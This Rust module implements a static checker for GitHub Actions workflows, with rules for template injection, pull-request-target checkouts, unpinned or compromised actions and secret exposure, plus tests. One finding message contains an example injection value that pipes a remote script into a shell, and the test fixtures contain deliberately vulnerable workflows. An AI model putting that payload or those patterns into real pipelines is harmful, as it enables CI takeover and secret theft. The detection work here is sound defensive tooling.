//! GitHub Actions workflow auditing.
//!
//! CI pipelines are now a primary supply-chain target. Each check below maps to a class
//! of real incidents:
//!
//! | Check | Incidents |
//! |---|---|
//! | `gha/template-injection` | Ultralytics (2024), nx/s1ngularity (2025), Shai-Hulud's discussion backdoor (2025) |
//! | `gha/untrusted-checkout` ("pwn request") | hackerbot-claw campaign, Trivy, TanStack, AsyncAPI (2026) |
//! | `gha/unpinned-action`, `gha/compromised-action` | tj-actions/changed-files and reviewdog (2025), trivy-action (2026) |
//! | `gha/excessive-permissions` | stolen write tokens in the above |
//! | `gha/public-trigger-with-secrets`, `gha/self-hosted-runner` | comment- and fork-triggered secret theft, Shai-Hulud runner abuse |
//! | `gha/secrets-inherit`, `gha/all-secrets-exposed` | secrets reaching code that should not see them |
//!
//! Checks are static and per file: no network access, so they run at org scale.

use crate::model::{Category, Confidence, Finding, Location, Severity, Snippet};
use regex::Regex;
use serde_yaml_ng::{Mapping, Value};
use std::collections::BTreeSet;
use std::sync::LazyLock;

/// Metadata for `ghaudit rules` and the docs.
pub struct WorkflowRule {
    pub id: &'static str,
    pub name: &'static str,
    pub severity: Severity,
}

pub static RULES: &[WorkflowRule] = &[
    WorkflowRule {
        id: "gha/template-injection",
        name: "Attacker-controlled ${{ }} in a script",
        severity: Severity::Critical,
    },
    WorkflowRule {
        id: "gha/untrusted-checkout",
        name: "Privileged trigger checks out pull request code",
        severity: Severity::Critical,
    },
    WorkflowRule {
        id: "gha/compromised-action",
        name: "Action with a known supply-chain compromise, not pinned",
        severity: Severity::High,
    },
    WorkflowRule {
        id: "gha/unpinned-action",
        name: "Action not pinned to a commit SHA",
        severity: Severity::Medium,
    },
    WorkflowRule {
        id: "gha/excessive-permissions",
        name: "GITHUB_TOKEN with write-all or unscoped on a privileged trigger",
        severity: Severity::High,
    },
    WorkflowRule {
        id: "gha/public-trigger-with-secrets",
        name: "Anyone can trigger a job that reads secrets",
        severity: Severity::High,
    },
    WorkflowRule {
        id: "gha/self-hosted-runner",
        name: "Self-hosted runner on a pull-request trigger",
        severity: Severity::Medium,
    },
    WorkflowRule {
        id: "gha/secrets-inherit",
        name: "All secrets passed to an external reusable workflow",
        severity: Severity::Medium,
    },
    WorkflowRule {
        id: "gha/all-secrets-exposed",
        name: "toJSON(secrets) exposes every secret",
        severity: Severity::High,
    },
];

/// Triggers that run with the base repository's secrets and a write-capable token
/// while carrying content an outsider controls.
const PRIVILEGED_TRIGGERS: &[&str] = &[
    "pull_request_target",
    "workflow_run",
    "issue_comment",
    "issues",
    "discussion",
    "discussion_comment",
];

/// Triggers any GitHub user can cause on a public repository.
const PUBLIC_TRIGGERS: &[&str] = &[
    "pull_request",
    "pull_request_target",
    "pull_request_review",
    "pull_request_review_comment",
    "issue_comment",
    "issues",
    "discussion",
    "discussion_comment",
    "fork",
    "watch",
];

/// Actions whose tags were rewritten to malicious commits.
const COMPROMISED: &[(&str, &str)] = &[
    (
        "tj-actions/changed-files",
        "tags were repointed to a secret-dumping commit in March 2025 (CVE-2025-30066)",
    ),
    (
        "tj-actions/eslint-changed-files",
        "compromised with tj-actions/changed-files in March 2025",
    ),
    (
        "reviewdog/action-setup",
        "the v1 tag was repointed to a malicious commit in March 2025 (CVE-2025-30154)",
    ),
    (
        "aquasecurity/trivy-action",
        "75 of 76 tags were force-pushed to a credential stealer in March 2026",
    ),
    (
        "aquasecurity/setup-trivy",
        "tags were force-pushed to a credential stealer in March 2026",
    ),
];

/// Contexts whose value an outside attacker can choose (titles, bodies, branch names,
/// commit messages, ...). Numbers, SHAs and repository names are not included.
static ATTACKER_CONTEXT: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
        r"github\.head_ref|github\.event\.(",
        r"issue\.(title|body)",
        r"|pull_request\.(title|body|head\.ref|head\.label|head\.repo\.default_branch)",
        r"|(comment|review|review_comment)\.body",
        r"|discussion\.(title|body)",
        r"|pages\b.*\.page_name",
        r"|(commits\b.*|head_commit)\.(message|author\.(email|name))",
        r"|workflow_run\.(head_branch|display_title|head_commit\.(message|author\.(email|name))|head_repository\.description)",
        r"|release\.(name|body|tag_name)",
        r")"
    ))
    .unwrap()
});

static EXPRESSION: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\$\{\{(.*?)\}\}").unwrap());

static UNTRUSTED_REF: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"github\.event\.pull_request\.(head\.(sha|ref|repo\.full_name)|number|merge_commit_sha)|github\.head_ref|refs/pull/|github\.event\.workflow_run\.(head_sha|head_branch|head_repository)|github\.event\.number",
    )
    .unwrap()
});

static ACTOR_GUARD: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"author_association|github\.actor\s*==|github\.triggering_actor\s*==|sender\.login\s*==|user\.login\s*==").unwrap()
});

static SHA: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^[0-9a-f]{40}$").unwrap());

/// `.github/workflows/*.yml` at the repository root.
pub fn is_workflow(rel_path: &str) -> bool {
    rel_path
        .strip_prefix(".github/workflows/")
        .is_some_and(|name| {
            !name.contains('/') && (name.ends_with(".yml") || name.ends_with(".yaml"))
        })
}

/// Audit one workflow file. Unparsable YAML yields no findings (GitHub would reject it too).
pub fn analyze(rel_path: &str, content: &str) -> Vec<Finding> {
    let Ok(doc) = serde_yaml_ng::from_str::<Value>(content) else {
        return Vec::new();
    };
    let Some(root) = doc.as_mapping() else {
        return Vec::new();
    };
    let mut audit = Audit {
        path: rel_path,
        content,
        lines: content.lines().collect(),
        cursor: 0,
        findings: Vec::new(),
    };
    let triggers = triggers(root);
    let privileged: Vec<&str> = triggers
        .iter()
        .map(String::as_str)
        .filter(|t| PRIVILEGED_TRIGGERS.contains(t))
        .collect();
    let public = triggers
        .iter()
        .any(|t| PUBLIC_TRIGGERS.contains(&t.as_str()));
    let top_permissions = root.get("permissions");

    if let Some(p) = top_permissions {
        audit.check_write_all(p, "permissions:");
    }
    if content.contains("toJSON(secrets)") || content.contains("toJson(secrets)") {
        let line = audit.find("(secrets)");
        audit.push(
            "gha/all-secrets-exposed",
            Severity::High,
            Confidence::High,
            "toJSON(secrets) exposes every secret",
            "Serializing the whole secrets context hands every repository and organization secret to this step, not just the ones it needs.".into(),
            line,
            "Pass only the secrets the step needs, one by one.",
        );
    }

    let jobs = root.get("jobs").and_then(Value::as_mapping);
    for (name, job) in jobs.into_iter().flatten() {
        let (Some(name), Some(job)) = (name.as_str(), job.as_mapping()) else {
            continue;
        };
        let job_line = audit.find(&format!("{name}:"));

        if let Some(p) = job.get("permissions") {
            audit.check_write_all(p, "permissions:");
        } else if top_permissions.is_none() && !privileged.is_empty() {
            audit.push(
                "gha/excessive-permissions",
                Severity::Medium,
                Confidence::Medium,
                "No permissions block on a privileged trigger",
                format!(
                    "Job `{name}` runs on `{}` without a `permissions:` block, so its GITHUB_TOKEN gets the repository default, which may include write access.",
                    privileged.join("`, `")
                ),
                job_line,
                "Add `permissions: {}` (or the minimum the job needs, e.g. `contents: read`) at the workflow or job level.",
            );
        }

        if let Some(uses) = job.get("uses").and_then(Value::as_str) {
            audit.check_uses(uses);
            if job.get("secrets").and_then(Value::as_str) == Some("inherit")
                && !uses.starts_with("./")
            {
                let line = audit.find("secrets: inherit");
                audit.push(
                    "gha/secrets-inherit",
                    Severity::Medium,
                    Confidence::High,
                    "All secrets passed to an external reusable workflow",
                    format!(
                        "`secrets: inherit` gives `{uses}` every secret this repository can read."
                    ),
                    line,
                    "Pass the specific secrets the called workflow needs under `secrets:`.",
                );
            }
        }

        if public && runs_on_self_hosted(job.get("runs-on")) {
            let line = audit.find("self-hosted");
            audit.push(
                "gha/self-hosted-runner",
                Severity::Medium,
                Confidence::Medium,
                "Self-hosted runner on a public trigger",
                format!("Job `{name}` runs on a self-hosted runner and can be triggered by outsiders. On a public repository, anyone can run code on that machine, and it persists between jobs."),
                line,
                "Use GitHub-hosted runners for untrusted events, or ephemeral, isolated self-hosted runners.",
            );
        }

        if !privileged.is_empty() || triggers.iter().any(|t| t == "issue_comment") {
            let job_text = serde_yaml_ng::to_string(job).unwrap_or_default();
            let comment_like: Vec<&str> = triggers
                .iter()
                .map(String::as_str)
                .filter(|t| {
                    [
                        "issue_comment",
                        "issues",
                        "discussion",
                        "discussion_comment",
                        "pull_request_review_comment",
                    ]
                    .contains(t)
                })
                .collect();
            if !comment_like.is_empty()
                && job_text.contains("secrets.")
                && !ACTOR_GUARD.is_match(&job_text)
            {
                audit.push(
                    "gha/public-trigger-with-secrets",
                    Severity::High,
                    Confidence::Medium,
                    "Anyone can trigger a job that reads secrets",
                    format!(
                        "Job `{name}` runs on `{}`, which any GitHub user can cause, uses secrets, and never checks who triggered it.",
                        comment_like.join("`, `")
                    ),
                    job_line,
                    "Gate the job with `if: contains(fromJSON('[\"OWNER\",\"MEMBER\",\"COLLABORATOR\"]'), github.event.comment.author_association)` (or the issue's author_association), or move the secret-using work to a workflow outsiders cannot trigger.",
                );
            }
        }

        let steps = job.get("steps").and_then(Value::as_sequence);
        for step in steps.into_iter().flatten() {
            let Some(step) = step.as_mapping() else {
                continue;
            };
            let uses = step.get("uses").and_then(Value::as_str);
            if let Some(uses) = uses {
                audit.check_uses(uses);
            }
            let with = step.get("with").and_then(Value::as_mapping);

            if let (Some(uses), Some(with)) = (uses, with)
                && uses.starts_with("actions/checkout@")
                && triggers
                    .iter()
                    .any(|t| t == "pull_request_target" || t == "workflow_run")
            {
                for key in ["ref", "repository"] {
                    if let Some(value) = with.get(key).and_then(Value::as_str)
                        && UNTRUSTED_REF.is_match(value)
                    {
                        let line = audit.find(value);
                        audit.push(
                            "gha/untrusted-checkout",
                            Severity::Critical,
                            Confidence::High,
                            "Privileged trigger checks out pull request code",
                            format!(
                                "This workflow runs on `pull_request_target`/`workflow_run` (with secrets and a write token) and checks out the pull request's code (`{key}: {value}`). Any build, install or test step then runs the attacker's code with those privileges (a \"pwn request\")."
                            ),
                            line,
                            "Use the `pull_request` trigger for building untrusted code. If you need privileges, split into an unprivileged `pull_request` workflow and a privileged one that only consumes its artifacts as data.",
                        );
                    }
                }
            }

            let mut scripts: Vec<&str> = Vec::new();
            if let Some(run) = step.get("run").and_then(Value::as_str) {
                scripts.push(run);
            }
            if let (Some(uses), Some(with)) = (uses, with)
                && uses.starts_with("actions/github-script@")
                && let Some(script) = with.get("script").and_then(Value::as_str)
            {
                scripts.push(script);
            }
            for script in scripts {
                audit.check_injection(script, &privileged);
            }
        }
    }
    audit.findings
}

struct Audit<'a> {
    path: &'a str,
    content: &'a str,
    lines: Vec<&'a str>,
    /// Line index where the previous lookup matched; lookups search forward from here
    /// so repeated text resolves to the occurrence being audited.
    cursor: usize,
    findings: Vec<Finding>,
}

impl Audit<'_> {
    /// 1-based line of the next occurrence of `needle` (falls back to the first one).
    fn find(&mut self, needle: &str) -> usize {
        let hit = (self.cursor..self.lines.len())
            .find(|&i| self.lines[i].contains(needle))
            .or_else(|| (0..self.lines.len()).find(|&i| self.lines[i].contains(needle)));
        match hit {
            Some(i) => {
                self.cursor = i;
                i + 1
            }
            None => self.cursor + 1,
        }
    }

    #[allow(clippy::too_many_arguments)]
    fn push(
        &mut self,
        rule: &str,
        severity: Severity,
        confidence: Confidence,
        title: &str,
        message: String,
        line: usize,
        remediation: &str,
    ) {
        let text = self
            .lines
            .get(line.saturating_sub(1))
            .copied()
            .unwrap_or_default();
        let column = text.len() - text.trim_start().len() + 1;
        self.findings.push(
            Finding::new(
                rule,
                Category::Workflow,
                severity,
                confidence,
                title,
                message,
                Location::new(self.path, line, column),
                text,
            )
            .with_snippet(Snippet::around(self.content, line, 1))
            .with_cwe([cwe(rule)])
            .with_remediation(remediation),
        );
    }

    fn check_write_all(&mut self, permissions: &Value, needle: &str) {
        if permissions.as_str() == Some("write-all") {
            let line = self.find(needle);
            self.push(
                "gha/excessive-permissions",
                Severity::High,
                Confidence::High,
                "GITHUB_TOKEN has write-all permissions",
                "`permissions: write-all` lets every step (and every action it uses) push code, create releases and modify the repository.".into(),
                line,
                "Grant only what the job needs, e.g. `permissions: { contents: read }`.",
            );
        }
    }

    fn check_uses(&mut self, uses: &str) {
        if uses.starts_with("./") || uses.starts_with("docker://") {
            return;
        }
        let Some((action, reference)) = uses.split_once('@') else {
            return;
        };
        if SHA.is_match(reference) {
            return;
        }
        let repo: String = action
            .split('/')
            .take(2)
            .collect::<Vec<_>>()
            .join("/")
            .to_ascii_lowercase();
        let line = self.find(uses);
        if let Some((_, what)) = COMPROMISED.iter().find(|(name, _)| *name == repo) {
            self.push(
                "gha/compromised-action",
                Severity::High,
                Confidence::High,
                "Previously compromised action referenced by a mutable tag",
                format!("`{uses}`: {what}. A tag can be moved again; only a commit SHA is immutable."),
                line,
                "Pin to a full commit SHA you have reviewed (keep the version in a comment), or replace the action.",
            );
            return;
        }
        let first_party = repo.starts_with("actions/") || repo.starts_with("github/");
        self.push(
            "gha/unpinned-action",
            if first_party { Severity::Low } else { Severity::Medium },
            Confidence::High,
            "Action not pinned to a commit SHA",
            format!("`{uses}` follows a tag or branch. Whoever controls `{repo}` (or compromises it) can change the code this workflow runs, as happened with tj-actions/changed-files."),
            line,
            "Pin to a full 40-character commit SHA and record the version in a comment: `uses: owner/repo@<sha> # v1.2.3`. Dependabot and Renovate keep such pins updated.",
        );
    }

    fn check_injection(&mut self, script: &str, privileged: &[&str]) {
        for caps in EXPRESSION.captures_iter(script) {
            let expr = caps[1].trim();
            let Some(context) = ATTACKER_CONTEXT.find(expr) else {
                continue;
            };
            let whole = caps.get(0).unwrap().as_str();
            let line = self.find(whole);
            let (severity, why) = if privileged.is_empty() {
                (Severity::Medium, "".to_string())
            } else {
                (
                    Severity::Critical,
                    format!(
                        " This workflow runs on `{}`, with secrets and a write-capable token.",
                        privileged.join("`, `")
                    ),
                )
            };
            self.push(
                "gha/template-injection",
                severity,
                Confidence::High,
                "Attacker-controlled ${{ }} in a script",
                format!(
                    "`{whole}` is pasted into the script text before the shell runs it. `{}` is chosen by whoever opens the issue, pull request or comment, so a value like `\"; curl evil.sh | sh; #` runs as code.{why}",
                    context.as_str()
                ),
                line,
                "Pass the value through an environment variable and quote it: `env: { TITLE: ${{ github.event.pull_request.title }} }` then `run: echo \"$TITLE\"`.",
            );
        }
    }
}

fn cwe(rule: &str) -> &'static str {
    match rule {
        "gha/template-injection" => "CWE-94",
        "gha/untrusted-checkout" => "CWE-829",
        "gha/unpinned-action" | "gha/compromised-action" => "CWE-829",
        "gha/excessive-permissions" => "CWE-250",
        "gha/public-trigger-with-secrets" | "gha/self-hosted-runner" => "CWE-284",
        _ => "CWE-200",
    }
}

/// Event names from `on:`, which may be a string, a list or a mapping.
fn triggers(root: &Mapping) -> BTreeSet<String> {
    let on = root.get("on").or_else(|| root.get(Value::Bool(true)));
    match on {
        Some(Value::String(s)) => [s.clone()].into(),
        Some(Value::Sequence(seq)) => seq
            .iter()
            .filter_map(|v| v.as_str().map(str::to_string))
            .collect(),
        Some(Value::Mapping(map)) => map
            .keys()
            .filter_map(|k| k.as_str().map(str::to_string))
            .collect(),
        _ => BTreeSet::new(),
    }
}

fn runs_on_self_hosted(runs_on: Option<&Value>) -> bool {
    match runs_on {
        Some(Value::String(s)) => s == "self-hosted",
        Some(Value::Sequence(seq)) => seq.iter().any(|v| v.as_str() == Some("self-hosted")),
        Some(Value::Mapping(m)) => m
            .get("labels")
            .is_some_and(|l| runs_on_self_hosted(Some(l))),
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ids(yaml: &str) -> Vec<String> {
        let mut v: Vec<String> = analyze(".github/workflows/x.yml", yaml)
            .into_iter()
            .map(|f| f.rule_id)
            .collect();
        v.sort();
        v
    }

    const SHA_PIN: &str = "actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955";

    #[test]
    fn only_root_workflow_files() {
        assert!(is_workflow(".github/workflows/ci.yml"));
        assert!(is_workflow(".github/workflows/release.yaml"));
        assert!(!is_workflow("sub/.github/workflows/ci.yml"));
        assert!(!is_workflow(".github/workflows/scripts/x.yml"));
        assert!(!is_workflow(".github/dependabot.yml"));
    }

    #[test]
    fn template_injection_severity_depends_on_trigger() {
        let wf = r#"
on: pull_request_target
permissions: {}
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Thanks for ${{ github.event.pull_request.title }}"
"#;
        let f = analyze(".github/workflows/x.yml", wf);
        assert_eq!(f.len(), 1);
        assert_eq!(
            (f[0].rule_id.as_str(), f[0].severity),
            ("gha/template-injection", Severity::Critical)
        );
        assert_eq!(f[0].location.start_line, 9);

        let wf = "on: pull_request\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ${{ github.head_ref }}\n";
        let f = analyze(".github/workflows/x.yml", wf);
        assert_eq!(
            (f[0].rule_id.as_str(), f[0].severity),
            ("gha/template-injection", Severity::Medium)
        );
    }

    #[test]
    fn injection_in_github_script_and_issue_comments() {
        let wf = r#"
on:
  issue_comment:
    types: [created]
permissions:
  issues: write
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea
        with:
          script: console.log("${{ github.event.comment.body }}")
"#;
        assert_eq!(ids(wf), vec!["gha/template-injection"]);
    }

    #[test]
    fn safe_expression_usage_is_not_flagged() {
        let wf = r#"
on: pull_request_target
permissions:
  contents: read
jobs:
  a:
    runs-on: ubuntu-latest
    env:
      TITLE: ${{ github.event.pull_request.title }}
    steps:
      - run: echo "$TITLE" "${{ github.event.pull_request.number }}" "${{ github.sha }}"
"#;
        assert!(ids(wf).is_empty(), "{:?}", ids(wf));
    }

    #[test]
    fn pwn_request_checkout() {
        let wf = format!(
            r#"
on: pull_request_target
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: {SHA_PIN}
        with:
          ref: ${{{{ github.event.pull_request.head.sha }}}}
      - run: npm ci && npm test
"#
        );
        let f = analyze(".github/workflows/x.yml", &wf);
        assert_eq!(
            f.iter().map(|f| f.rule_id.as_str()).collect::<Vec<_>>(),
            vec!["gha/untrusted-checkout"]
        );
        assert_eq!(f[0].location.start_line, 11);

        // The same checkout on `pull_request` is the safe pattern.
        assert!(ids(&wf.replace("pull_request_target", "pull_request")).is_empty());
        // pull_request_target that checks out the base branch is fine.
        let base_only = format!(
            "on: pull_request_target\npermissions: {{}}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {SHA_PIN}\n"
        );
        assert!(ids(&base_only).is_empty());
    }

    #[test]
    fn pinning() {
        let wf = r#"
on: push
permissions: {}
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: some-org/deploy-action@main
      - uses: some-org/deploy-action@08eba0b27e820071cde6df949e0beb9ba4906955 # v2.1.0
      - uses: ./.github/actions/local
      - uses: docker://alpine:3.20
      - uses: tj-actions/changed-files@v45
"#;
        let f = analyze(".github/workflows/x.yml", wf);
        let got: Vec<(&str, Severity, usize)> = f
            .iter()
            .map(|f| (f.rule_id.as_str(), f.severity, f.location.start_line))
            .collect();
        assert_eq!(
            got,
            vec![
                ("gha/unpinned-action", Severity::Low, 8),
                ("gha/unpinned-action", Severity::Medium, 9),
                ("gha/compromised-action", Severity::High, 13),
            ]
        );
    }

    #[test]
    fn permissions() {
        assert_eq!(
            ids("on: push\npermissions: write-all\njobs: {}\n"),
            vec!["gha/excessive-permissions"]
        );
        let missing = "on: issue_comment\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n";
        assert_eq!(ids(missing), vec!["gha/excessive-permissions"]);
        // A plain push workflow without a permissions block is common and not flagged.
        assert!(ids("on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n").is_empty());
    }

    #[test]
    fn comment_triggers_need_an_actor_check_before_using_secrets() {
        let wf = r#"
on: issue_comment
permissions:
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
        env:
          TOKEN: ${{ secrets.DEPLOY_TOKEN }}
"#;
        assert_eq!(ids(wf), vec!["gha/public-trigger-with-secrets"]);
        let guarded = wf.replace(
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n    if: contains(fromJSON('[\"OWNER\",\"MEMBER\"]'), github.event.comment.author_association)\n",
        );
        assert!(ids(&guarded).is_empty(), "{:?}", ids(&guarded));
    }

    #[test]
    fn secrets_handling_and_self_hosted_runners() {
        let wf = r#"
on: [push, pull_request]
permissions: {}
jobs:
  call:
    uses: other-org/ci/.github/workflows/build.yml@08eba0b27e820071cde6df949e0beb9ba4906955
    secrets: inherit
  local:
    uses: ./.github/workflows/build.yml
    secrets: inherit
  build:
    runs-on: [self-hosted, linux]
    steps:
      - run: echo '${{ toJSON(secrets) }}' > /dev/null
"#;
        assert_eq!(
            ids(wf),
            vec![
                "gha/all-secrets-exposed",
                "gha/secrets-inherit",
                "gha/self-hosted-runner"
            ]
        );
        // Self-hosted runners on push-only workflows are normal.
        assert!(
            ids(
                "on: push\npermissions: {}\njobs:\n  a:\n    runs-on: self-hosted\n    steps: []\n"
            )
            .is_empty()
        );
    }

    #[test]
    fn malformed_yaml_is_ignored() {
        assert!(ids("on: [push\njobs: {").is_empty());
        assert!(ids("just a string").is_empty());
    }

    #[test]
    fn every_rule_is_documented() {
        let src = include_str!("workflows.rs");
        for rule in RULES {
            assert!(
                src.matches(rule.id).count() >= 3,
                "{} documented but unused?",
                rule.id
            );
        }
    }
}
